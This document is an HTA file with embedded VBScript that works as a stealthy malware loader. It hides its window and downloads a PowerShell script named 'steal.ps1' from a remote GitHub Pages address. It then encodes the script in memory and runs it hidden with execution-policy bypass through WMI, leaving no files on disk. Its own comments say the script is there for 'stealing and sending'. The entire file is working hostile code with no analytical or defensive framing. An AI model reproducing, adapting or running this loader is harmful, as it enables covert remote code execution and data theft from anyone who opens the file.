<html>
<head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
<script language="VBScript">
window.resizeTo 0,0:window.moveTo -2000,-2000
On Error Resume Next

Dim sh, fso, xh, ps1Content, xml, node, stream, b64Payload, finalCmd, wmi, proc, w
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")

' 1. Download the steal.ps1 from GitHub
xh.Open "GET", "https://lozix94-afk.github.io/hahadicexd/steal.ps1", False
xh.Send

If xh.Status = 200 Then
    ps1Content = xh.responseText
    Set xh = Nothing
    
    ' 2. Base64 Encode the entire steal.ps1 script in memory
    Set xml = CreateObject("MSXML2.DOMDocument")
    Set node = xml.CreateElement("b64")
    node.dataType = "bin.base64"
    
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 2
    stream.Charset = "unicode"
    stream.Open
    stream.WriteText ps1Content
    stream.Position = 0
    stream.Type = 1
    node.nodeTypedValue = stream.Read
    b64Payload = node.text
    
    ' 3. Construct the EncodedCommand
    finalCmd = "powershell -NoP -Exec Bypass -WindowStyle Hidden -EncodedCommand " & b64Payload
    
    ' 4. Run via WMI (No PowerShell window, no disk drops)
    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
    Set proc = wmi.Get("Win32_Process")
    proc.Create finalCmd, Null, Null
    
    ' 5. Wait 15 seconds for the script to finish stealing and sending
    w = Timer()
    Do While Timer() - w < 15
    Loop
End If

window.close()
</script>
</head><body></body></html>
